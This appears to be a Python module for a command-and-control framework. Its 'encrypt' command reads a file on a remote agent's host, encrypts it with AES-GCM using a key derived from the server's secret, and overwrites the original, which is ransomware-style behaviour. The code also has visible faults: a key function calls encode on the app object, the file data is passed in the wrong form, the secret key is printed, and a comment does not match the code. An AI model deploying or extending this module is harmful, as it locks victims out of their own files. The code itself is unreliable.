NAME = "encrypt"
DESCRIPTION = "Encrypt a file using the server's key."
PARAMS = [
    {"name":"file", "description":"Encrypt a file on the client using the server's key.", "type":"str"}
]

# Dependencies: 
# 1. NtQueryInformationProcess (to find PEB)
DEPENDENCIES = ["read", "write"]

def generate_encrypted_header():
    from flask import current_app
    from hashlib import pbkdf2_hmac
    print(current_app.config["SECRET_KEY"])
    secret = current_app.config["SECRET_KEY"].encode()
    salt = current_app.config["SECRET_KEY"][:16].encode()
    iterations = 200
    header = pbkdf2_hmac("sha256", secret, salt, iterations, dklen=32)[:8]
    print(f"Header = {header}")
    return header

def is_encrypted(data, header):
    if len(data) > 8 and data[:8] == header:
        return True
    return False

def encrypt_bytearray(data: bytearray, header) -> bytes:
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from hashlib import pbkdf2_hmac
    from flask import current_app
    secret = current_app.config["SECRET_KEY"]
    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 2000, dklen=32)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, bytes(data), None)
    return header + salt + nonce + ciphertext

def generate_server_key():
    from hashlib import pbkdf2_hmac
    from flask import current_app
    password = current_app
    salt = current_app.config["SECRET_KEY"][:16]
    iterations = 2000
    return pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, dklen=32)


def function(agent_id, args):
    header = generate_encrypted_header()
    file = args[0]
    print(f"Generated encrypted header: {header}")
    data = read(agent_id, [file])
    print(f"Received data {data}")
    if(data["retval"] != 0):
        return {"retval":"Error opening file"}
    if is_encrypted(data["data"], header):
        return {"retval":"File already encrypted"}
    encrypted = encrypt_bytearray(data, header)
    print(f"About to write {encrypted}")
    write_ret = write(agent_id, [file, encrypted])
    if write_ret["retval"] != 0:
        return {"retval":"Error writing"}
    return {"retval":0} 